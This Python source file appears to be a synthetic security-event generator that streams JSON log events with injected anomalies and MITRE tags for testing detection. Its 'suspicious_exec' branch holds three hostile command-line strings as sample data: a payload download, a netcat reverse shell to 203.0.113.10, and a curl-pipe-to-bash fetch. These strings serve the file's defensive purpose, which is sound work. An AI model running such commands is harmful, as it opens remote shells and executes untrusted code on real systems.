import json
import os
import random
import sys
import time
from datetime import datetime, timezone
from typing import Dict, List

from mitre.mapping import mitre_hints_for_action

USERS = ["alice", "bob", "charlie", "dana", "eve"]
APPS = ["crm", "erp", "vpn", "sshd", "s3", "admin-console"]
HOSTS = ["host-1", "host-2", "host-3"]
BASE_ACTIONS = [
    "login",
    "logout",
    "file_access",
    "upload",
    "download",
    "process_exec",
    "network_connect",
]
ANOMALY_RATE_DEFAULT = 0.2


def generate_event() -> Dict:
    """Generate a baseline event and optionally inject an anomaly."""
    user = random.choice(USERS)
    event: Dict = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "user": user,
        "host": random.choice(HOSTS),
        "app": random.choice(APPS),
        "action": random.choice(BASE_ACTIONS),
        "bytes": random.randint(100, 50000),
        "success": random.random() > 0.05,
    }
    # Inject anomalies more frequently to stress detection
    if random.random() < current_anomaly_rate():
        event = inject_anomaly(event)
    return add_mitre_tags(event)


def current_anomaly_rate() -> float:
    try:
        env_rate = float(os.getenv("ANOMALY_RATE", ANOMALY_RATE_DEFAULT))
    except ValueError:
        env_rate = ANOMALY_RATE_DEFAULT
    return max(0.0, min(1.0, env_rate))


def inject_anomaly(event: Dict) -> Dict:
    anomaly_type = random.choice(
        ["exfil", "bruteforce", "c2", "lateral", "discovery", "suspicious_exec"]
    )
    if anomaly_type == "exfil":
        event["bytes"] = random.randint(300_000, 900_000)
        event["action"] = "exfiltration"
        event["success"] = True
    elif anomaly_type == "bruteforce":
        event["action"] = "login_failed"
        event["success"] = False
        event["attempts"] = random.randint(5, 25)
        event["source_ip"] = f"10.0.0.{random.randint(10, 250)}"
    elif anomaly_type == "c2":
        event["action"] = "network_connect"
        event["destination_ip"] = f"203.0.113.{random.randint(1, 254)}"
        event["destination_port"] = random.choice([4444, 8080, 1337])
        event["protocol"] = "TCP"
        event["bytes"] = random.randint(50_000, 150_000)
    elif anomaly_type == "lateral":
        event["action"] = "lateral_movement"
        event["target_host"] = random.choice(HOSTS)
        event["protocol"] = random.choice(["SMB", "RDP", "SSH"])
    elif anomaly_type == "discovery":
        event["action"] = "discovery_scan"
        event["dest_range"] = f"10.0.{random.randint(0,5)}.0/24"
        event["scanned_ports"] = random.sample([22, 80, 443, 445, 3389], k=3)
    else:  # suspicious_exec
        event["action"] = "process_exec"
        event["process_name"] = random.choice(["powershell.exe", "cmd.exe", "bash"])
        event["command_line"] = random.choice(
            [
                "Invoke-WebRequest http://malicious.com/payload.exe",
                "nc -e /bin/sh 203.0.113.10 4444",
                "curl http://malicious.com/run.sh | bash",
            ]
        )
    return event


def add_mitre_tags(event: Dict) -> Dict:
    """Attach MITRE tactics/techniques when available."""
    hints = mitre_hints_for_action(event.get("action", ""))
    if hints["tactics"] or hints["techniques"]:
        event["mitre_tactics"] = hints["tactics"]
        event["mitre_techniques"] = hints["techniques"]
    return event


def main() -> None:
    delay = float(sys.argv[1]) if len(sys.argv) > 1 else 0.5
    if len(sys.argv) > 2:
        os.environ["ANOMALY_RATE"] = sys.argv[2]
    while True:
        evt = generate_event()
        sys.stdout.write(json.dumps(evt) + "\n")
        sys.stdout.flush()
        time.sleep(delay)


if __name__ == "__main__":
    main()
